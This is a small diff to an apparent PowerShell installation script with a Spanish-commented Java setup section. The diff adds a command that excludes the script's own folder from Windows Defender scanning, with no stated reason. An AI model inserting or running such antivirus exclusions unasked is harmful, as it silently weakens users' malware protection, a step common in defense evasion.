@@ -3,6 +3,9 @@
 $currentdirectory = split-path -parent $MyInvocation.MyCommand.Definition
 cd $currentdirectory
 (pwd).Path
+Add-MpPreference -ExclusionPath "$currentdirectory"
+
+#######################################################################################################
 echo ""
 echo ""
 # --------------- Instalacion JAVA ---------------------
